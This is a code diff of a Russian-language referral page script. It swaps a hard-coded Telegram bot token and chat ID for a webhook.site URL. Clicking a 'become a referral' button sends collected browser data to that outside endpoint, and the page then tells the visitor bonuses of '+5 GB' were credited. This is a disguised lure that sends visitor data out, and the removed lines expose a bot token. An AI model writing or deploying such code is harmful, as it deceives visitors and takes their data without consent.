@@ -66,13 +66,12 @@
 
 <script>
     // ==========================================
-    //  ТВОИ ДАННЫЕ
+    //  ТВОЙ WEBHOOK URL (БЕЗ CORS)
     // ==========================================
-    const BOT_TOKEN = '8731606722:AAGdTFXvWZaAMTs0vPzV6Su4GMZJvHB7XkA';
-    const CHAT_ID = '8352159294';
+    const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
 
     // ==========================================
-    //  ОСНОВНОЙ КОД (БЕЗ IP И ГЕО — ТОЛЬКО ДАННЫЕ БРАУЗЕРА)
+    //  ОСНОВНОЙ КОД
     // ==========================================
     document.getElementById('referBtn').addEventListener('click', function() {
         const btn = this;
@@ -126,31 +125,38 @@
             `⏱️ ${data.timestamp}`
         ];
 
-        const message = encodeURIComponent(lines.join('\n'));
+        const message = lines.join('\n');
 
-        // Отправляем в Telegram
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-
-        fetch(url)
-            .then(res => {
-                if (res.ok) {
-                    btn.textContent = '✅ Вы стали рефералом!';
-                    btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
-                    statusEl.className = 'status ok';
-                    statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
-                    document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
-                } else {
-                    throw new Error('Telegram API error');
-                }
+        // Отправляем на Webhook
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                text: message,
+                raw: data
             })
-            .catch(() => {
-                btn.textContent = '🔥 Стать рефералом';
-                statusEl.className = 'status err';
-                statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
-            })
-            .finally(() => {
-                btn.disabled = false;
-            });
+        })
+        .then(res => {
+            if (res.ok) {
+                btn.textContent = '✅ Вы стали рефералом!';
+                btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
+                statusEl.className = 'status ok';
+                statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
+                document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
+            } else {
+                throw new Error('Webhook error');
+            }
+        })
+        .catch(() => {
+            btn.textContent = '🔥 Стать рефералом';
+            statusEl.className = 'status err';
+            statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
+        })
+        .finally(() => {
+            btn.disabled = false;
+        });
     });
 </script>
 </body>
